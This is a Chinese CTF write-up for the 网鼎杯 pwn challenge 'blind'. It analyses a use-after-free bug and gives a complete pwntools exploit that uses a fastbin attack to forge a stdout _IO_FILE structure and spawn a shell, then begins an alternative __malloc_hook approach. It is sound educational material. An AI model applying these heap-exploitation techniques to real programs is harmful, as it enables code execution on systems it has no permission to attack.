<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="google-site-verification" content="n74fzVGuzCcR7QhYWu-qaPH7lKOjZC3b3tDU0egKMNA" />














  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="网鼎杯pwn-blind题目下载链接： 链接：https://pan.baidu.com/s/19Imm-V-i71vpEN1mofwOhQ 密码：isek 题目分析程序提供了下面几种功能：12345678int print_choice()&amp;#123;  puts(&quot;1.new&quot;);  puts(&quot;2.change&quot;);  puts(&quot;3.release&quot;);  puts(&quot;4.exit&quot;);">
<meta property="og:type" content="article">
<meta property="og:title" content="网鼎杯-blind">
<meta property="og:url" content="https://e3pem.github.io/2018/09/30/wangdingbei/网鼎杯pwn-blind/index.html">
<meta property="og:site_name" content="e3pem&#39;s Blog">
<meta property="og:description" content="网鼎杯pwn-blind题目下载链接： 链接：https://pan.baidu.com/s/19Imm-V-i71vpEN1mofwOhQ 密码：isek 题目分析程序提供了下面几种功能：12345678int print_choice()&amp;#123;  puts(&quot;1.new&quot;);  puts(&quot;2.change&quot;);  puts(&quot;3.release&quot;);  puts(&quot;4.exit&quot;);">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2018-09-30T15:39:48.875Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="网鼎杯-blind">
<meta name="twitter:description" content="网鼎杯pwn-blind题目下载链接： 链接：https://pan.baidu.com/s/19Imm-V-i71vpEN1mofwOhQ 密码：isek 题目分析程序提供了下面几种功能：12345678int print_choice()&amp;#123;  puts(&quot;1.new&quot;);  puts(&quot;2.change&quot;);  puts(&quot;3.release&quot;);  puts(&quot;4.exit&quot;);">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.3',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://e3pem.github.io/2018/09/30/wangdingbei/网鼎杯pwn-blind/"/>





  <title>网鼎杯-blind | e3pem's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">e3pem's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description"></h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://e3pem.github.io/2018/09/30/wangdingbei/网鼎杯pwn-blind/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="e3pem">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="e3pem's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">网鼎杯-blind</h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-30T23:38:20+08:00">
                2018-09-30
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="网鼎杯pwn-blind"><a href="#网鼎杯pwn-blind" class="headerlink" title="网鼎杯pwn-blind"></a>网鼎杯pwn-blind</h1><p>题目下载链接：</p>
<p>链接：<a href="https://pan.baidu.com/s/19Imm-V-i71vpEN1mofwOhQ" target="_blank" rel="noopener">https://pan.baidu.com/s/19Imm-V-i71vpEN1mofwOhQ</a> 密码：isek</p>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>程序提供了下面几种功能：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">print_choice</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1.new"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2.change"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3.release"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4.exit"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Choice:"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>new：创建一个堆块，大小为0x68，程序对创建堆块的数量进行了限制，最多只能创建5个。</li>
<li>change：对分配的堆块进行编辑。</li>
<li>release：释放分配的堆块，在释放后没有将对应的指针设置为NULL，存在UAF漏洞。</li>
</ul>
<p>查看程序开启了哪些保护措施：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>
<p>可以看到开启了canary、full relro、nx保护措施。</p>
<h2 id="利用思路——劫持FILE结构体"><a href="#利用思路——劫持FILE结构体" class="headerlink" title="利用思路——劫持FILE结构体"></a>利用思路——劫持FILE结构体</h2><p>利用<code>fastbin attack</code>可以实现分配一个虚假的chunk在bss段上，进而控制bss段上的数据，实现任意地址写入。再有了任意地址写入的能力后，关键是如何控制程序的流程，程序里面没有输出函数，不存在信息泄露，got表不可写，无法通过修改got表来控制程序流程。</p>
<p>这里采用劫持<code>_IO_FILE</code>的方式来控制程序流程，程序中<code>stdin</code>、<code>stdout</code>、<code>stderror</code>结构体的指针均存放在bss段上，由于可以做到任意地址写入，把这里的stdout指针指向我们伪造的<code>_IO_FILE</code>结构体，并将其中的函数表中的值指向0x4008e3处（这里会执行system(‘/bin/sh’)）</p>
<p>往bss段上分配虚假的chunk，需要满足对chunk中size域的校验，程序分配的chunk大小均为0x70，而在bss段上恰好可以通过偏移的方式来满足这个条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /100xb 0x602020</span><br><span class="line">0x602020 &lt;stdout&gt;:	0x20	0xb6	0x0c	0x45	0x17	0x7f	0x00	0x00</span><br><span class="line">0x602028:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00</span><br><span class="line">0x602030 &lt;stdin&gt;:	0xe0	0xa8	0x0c	0x45	0x17	0x7f	0x00	0x00</span><br><span class="line">0x602038:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00</span><br><span class="line">0x602040 &lt;stderr&gt;:	0x40	0xb5	0x0c	0x45	0x17	0x7f	0x00	0x00</span><br><span class="line">0x602048:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00</span><br><span class="line">0x602050:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00</span><br><span class="line">0x602058:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00</span><br></pre></td></tr></table></figure></p>
<p>如果chunk是从0x602025-0x8=0x60201d、0x602035-0x8=0x60202d、0x602045-0x8=0x60203d处开始，那么这样的chunk刚好可以满足条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /10xg 0x60203d</span><br><span class="line">0x60203d:	0x17450cb540000000	0x000000000000007f</span><br><span class="line">0x60204d:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x60205d:	0x0000602200000000	0x000062c000000000</span><br><span class="line">0x60206d:	0x000062c010000000	0x000062c080000000</span><br></pre></td></tr></table></figure></p>
<h2 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, endian=<span class="string">'little'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./blind'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./blind'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line">	p.recvuntil(<span class="string">'Done!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content,flag=<span class="number">0</span>)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">2</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line">	<span class="keyword">if</span> flag==<span class="number">0</span>:</span><br><span class="line">		p.recvuntil(<span class="string">'Done!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">release</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">3</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'Done!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(where,to,flag=<span class="number">0</span>)</span>:</span></span><br><span class="line">	change(<span class="number">5</span>,<span class="string">'\x00'</span>*<span class="number">0x13</span>+p64(where),flag)</span><br><span class="line">	change(<span class="number">0</span>,to,flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">10</span>) <span class="comment">#chunk 0</span></span><br><span class="line">new(<span class="number">1</span>,<span class="string">'b'</span>*<span class="number">10</span>) <span class="comment">#chunk 1</span></span><br><span class="line"><span class="comment"># new(2,'c'*10) #2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里采用的是double free的方式来往bss分配数据，其实可以直接在free一个chunk后修改其中的fd指针来实现同样的功能</span></span><br><span class="line"><span class="comment"># 这里用double free显得复杂化了</span></span><br><span class="line">release(<span class="number">0</span>)</span><br><span class="line">release(<span class="number">1</span>)</span><br><span class="line">release(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">10</span>) <span class="comment">#chunk 0</span></span><br><span class="line">new(<span class="number">3</span>,<span class="string">'b'</span>*<span class="number">10</span>) <span class="comment">#chunk 1</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x60203d</span>)</span><br><span class="line">change(<span class="number">2</span>,payload)</span><br><span class="line">new(<span class="number">4</span>,<span class="string">'c'</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">5</span>,<span class="string">'\x00'</span>)</span><br><span class="line"><span class="comment"># 把虚假的FILE结构体伪造在0x602100处</span></span><br><span class="line"><span class="comment"># 相对于FILE偏移为0xd8处为指向函数表的指针</span></span><br><span class="line"><span class="comment"># 该指针指向0x602200，也即伪造的函数表</span></span><br><span class="line">payload = p64(<span class="number">0xfbada887</span>)+p64(<span class="number">0x0</span>)*<span class="number">7</span>+p64(<span class="number">1</span>)</span><br><span class="line">write(<span class="number">0x602100</span>,payload)</span><br><span class="line">payload = p64(<span class="number">0x602200</span>)</span><br><span class="line">write(<span class="number">0x6021d8</span>,payload)</span><br><span class="line">payload = p64(<span class="number">0x4008e3</span>)*<span class="number">8</span></span><br><span class="line">write(<span class="number">0x602200</span>,payload)</span><br><span class="line"><span class="comment"># gdb.attach(p,gdbscript='''</span></span><br><span class="line"><span class="comment"># b *0x400c6e</span></span><br><span class="line"><span class="comment"># 	''')</span></span><br><span class="line"><span class="comment"># raw_input('sss')</span></span><br><span class="line">write(<span class="number">0x602020</span>,p64(<span class="number">0x602100</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="关于-IO-FILE的问题"><a href="#关于-IO-FILE的问题" class="headerlink" title="关于_IO_FILE的问题"></a>关于_IO_FILE的问题</h2><p>这里将FILE结构体伪造在了0x602100处，0x602100处对应的值为FILE结构体里面的flag，这个标识的值怎么来的？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /10xg 0x00007f17450cb620</span><br><span class="line">0x7f17450cb620 &lt;_IO_2_1_stdout_&gt;:	0x00000000fbad2887	0x00007f17450cb6a3</span><br><span class="line">0x7f17450cb630 &lt;_IO_2_1_stdout_+16&gt;:	0x00007f17450cb6a3	0x00007f17450cb6a3</span><br><span class="line">0x7f17450cb640 &lt;_IO_2_1_stdout_+32&gt;:	0x00007f17450cb6a3	0x00007f17450cb6a3</span><br><span class="line">0x7f17450cb650 &lt;_IO_2_1_stdout_+48&gt;:	0x00007f17450cb6a3	0x00007f17450cb6a3</span><br></pre></td></tr></table></figure></p>
<p>查看stdout结构体原始的flag值为<code>0xfbad2887</code>，但是在虚假FILE结构体里将flag设置为这个值总是会出错。而将其设置为writeup里面的值<code>0xfbada887</code>就没有问题。所以在利用IO_FILE控制程序流程时flag的值应该怎么选择呢？</p>
<p>先比较这两个<code>_flags</code>值（由于<code>_flags</code>值的高2字节为magic，不用管）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x2887--&gt;0010 1000 10000111</span><br><span class="line">0xA887--&gt;1010 1000 10000111</span><br></pre></td></tr></table></figure></p>
<p>可以发现在第二字节的最高位处该值为0x1，flag的值表示的是状态信息，都是通过与某个#define好的值进行与、或操作，这里对应的值应为0x8000，全局搜索glibc源码，找到该值对应的变量为<code>_IO_USER_LOCK</code>。</p>
<p>在网上搜索该变量相关的信息，找到了下面的文章：<br><a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">参考链接</a></p>
<p>我们劫持的是stdout结构体，在劫持后程序立马调用了函数puts：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1 &lt;= <span class="number">5</span> &amp;&amp; *(&amp;ptr + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content:"</span>, &amp;s);</span><br><span class="line">  get_input((__int64)*(&amp;ptr + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1), <span class="number">0x68</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>puts函数的调用栈回溯：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vfprintf+11</span><br><span class="line">_IO_file_xsputn</span><br><span class="line">_IO_file_overflow</span><br><span class="line">funlockfile</span><br><span class="line">_IO_file_write</span><br><span class="line">write</span><br></pre></td></tr></table></figure></p>
<p>puts函数源码中通过<code>_IO_puts</code>函数实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_puts (const char *str)</span><br><span class="line">&#123;</span><br><span class="line">  int result = EOF;</span><br><span class="line">  _IO_size_t len = strlen (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  if ((_IO_vtable_offset (_IO_stdout) != 0</span><br><span class="line">       || _IO_fwide (_IO_stdout, -1) == -1)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (&apos;\n&apos;, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + 1);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>函数开始时调用了<code>_IO_acquire_lock</code>函数，问题就出现在这里，跟进该函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> _IO_acquire_lock(_fp) \</span></span><br><span class="line">  <span class="keyword">do</span> &#123;									      \</span><br><span class="line">    _IO_FILE *_IO_acquire_lock_file					      \</span><br><span class="line">	__attribute__((cleanup (_IO_acquire_lock_fct)))			      \</span><br><span class="line">	= (_fp);							      \</span><br><span class="line">    _IO_flockfile (_IO_acquire_lock_file);</span><br></pre></td></tr></table></figure></p>
<p>其中又调用了<code>_IO_acquire_lock_fct</code>函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span><br><span class="line">__attribute__ ((__always_inline__))</span><br><span class="line">_IO_acquire_lock_fct (_IO_FILE **p)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_FILE *fp = *p;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_USER_LOCK) == <span class="number">0</span>)</span><br><span class="line">    _IO_funlockfile (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>该函数中对标志位<code>_IO_USER_LOCK</code>进行了检查，不能让<code>fp-&gt;_flags &amp; _IO_USER_LOCK</code>的值为0，这里需要bypass。</p>
<p>在回过头来看这两个<code>_flag</code>值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x2887--&gt;0010 1000 10000111</span><br><span class="line">0xA887--&gt;1010 1000 10000111</span><br></pre></td></tr></table></figure></p>
<p>发现0x2887正是因为<code>_IO_USER_LOCK</code>为0，导致程序执行了<code>_IO_funlockfile (fp)</code>函数，造成无法正常触发漏洞。</p>
<h2 id="利用思路——劫持-malloc-hook"><a href="#利用思路——劫持-malloc-hook" class="headerlink" title="利用思路——劫持__malloc_hook"></a>利用思路——劫持__malloc_hook</h2><p>这里的思路是参考的大佬的思路：<a href="http://p4nda.top/2018/08/27/WDBCTF-2018/" target="_blank" rel="noopener">http://p4nda.top/2018/08/27/WDBCTF-2018/</a><br>首先利用任意地址写的能力可以在bss段上伪造chunk的各个字段。这里没有信息泄露，但是又需要劫持程序的流程。通过伪造一个不属于fast bin的chunk，free该chunk会把该chunk放进unsorted bin，这样<code>main arena+88</code>的地址就会出现在bss段上了，通过任意地址写的能力将<code>main arena+88</code>的地址最后一个字节改为0x00，而<code>malloc_hook</code>的地址就在<code>(main arena+88)&amp;(~0xFF)+0x10</code>处，然后就可以修改<code>malloc_hook</code>的值了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /20xg 0x602040</span><br><span class="line">0x602040 &lt;stderr&gt;:	0x00007fa93859c540	0x0000000000000000</span><br><span class="line">0x602050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602060:	0x0000000000b0a010	0x0000000000b0a080</span><br><span class="line">0x602070:	0x0000000000b0a010	0x0000000000b0a080</span><br><span class="line">0x602080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602090:	0x0000000000000000	0x0000000000000003</span><br><span class="line">0x6020a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>虚假的chunk起始地址需要满足这个条件：<code>__builtin_expect (misaligned_chunk (p), 0)</code>，在调试过程中发现如果将chunk起始地址设置在0x602068处，会产生如下的错误：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x48 bytes:</span><br><span class="line">    &quot;*** Error in `./blind&apos;: free(): invalid pointer: 0x0000000000602078 ***\n&quot;</span><br><span class="line">[DEBUG] Received 0x1d bytes:</span><br><span class="line">    &apos;======= Backtrace: =========\n&apos;</span><br><span class="line">[DEBUG] Received 0x985 bytes:</span><br><span class="line">    &apos;/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fabcfaa77e5]\n&apos;</span><br><span class="line">    &apos;/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fabcfab037a]\n&apos;</span><br><span class="line">    &apos;/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fabcfab453c]\n&apos;</span><br><span class="line">    &apos;./blind[0x400bd6]\n&apos;</span><br><span class="line">    &apos;./blind[0x400ca5]\n&apos;</span><br><span class="line">    &apos;/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fabcfa50830]\n&apos;</span><br><span class="line">    &apos;./blind[0x4007d9]\n&apos;</span><br><span class="line">    &apos;======= Memory map: ========\n&apos;</span><br><span class="line">    &apos;00400000-00401000 r-xp 00000000 08:01 1050380                            /home/ym/Desktop/ctf/wdb/blind/blind\n&apos;</span><br><span class="line">    &apos;00601000-00602000 r--p 00001000 